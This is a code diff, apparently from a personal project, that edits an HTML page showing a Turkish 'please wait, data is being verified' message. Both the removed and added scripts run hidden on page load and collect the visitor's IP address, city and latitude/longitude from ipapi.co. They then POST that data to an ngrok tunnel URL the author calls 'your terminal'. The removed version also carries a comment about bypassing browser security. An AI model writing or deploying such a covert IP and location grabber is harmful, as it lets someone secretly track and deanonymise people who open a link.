@@ -38,43 +38,33 @@
         <p>Lütfen bekleyiniz, veriler doğrulanıyor...</p>
     </div>
 
-    <script>
-        // 1. Kullanıcının IP ve genel konum bilgilerini al
-        fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            
-            // Terminaline gidecek olan veri paketi
-            const payload = {
-                ip: data.ip,
-                city: data.city,
-                country: data.country_name,
-                loc: data.latitude + "," + data.longitude,
-                ua: navigator.userAgent
-            };
+<script>
+    async function veriyiToplaVeGonder() {
+        try {
+            // 1. IP Bilgilerini çek
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
 
-            // 2. Senin Ngrok tüneline veriyi gönder
-            // NOT: Ngrok linkin değiştikçe burayı güncellemen gerekir!
-            const ngrokURL = "https://punctual-villain-arson.ngrok-free.dev/log";
-
-            fetch(ngrokURL, {
+            // 2. Veriyi senin terminaline gönder (JSON formatında)
+            await fetch("https://punctual-villain-arson.ngrok-free.dev/log", {
                 method: 'POST',
-                mode: 'no-cors', // Tarayıcı güvenliğini aşmak için
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(payload)
-            })
-            .then(() => {
-                console.log("Bağlantı başarılı.");
-            })
-            .catch(err => {
-                console.error("Hata oluştu:", err);
+                body: JSON.stringify({
+                    ip: data.ip,
+                    city: data.city,
+                    loc: data.latitude + "," + data.longitude
+                })
             });
-        })
-        .catch(err => {
-            console.error("Bilgi alınamadı:", err);
-        });
-    </script>
+            console.log("Veri paketlendi ve fırlatıldı!");
+        } catch (err) {
+            console.error("Bir hata çıktı ama terminale boş gitmesin diye durduruldu.");
+        }
+    }
+
+    // Fonksiyonu çalıştır
+    veriyiToplaVeGonder();
+</script>
 </body>
 </html>
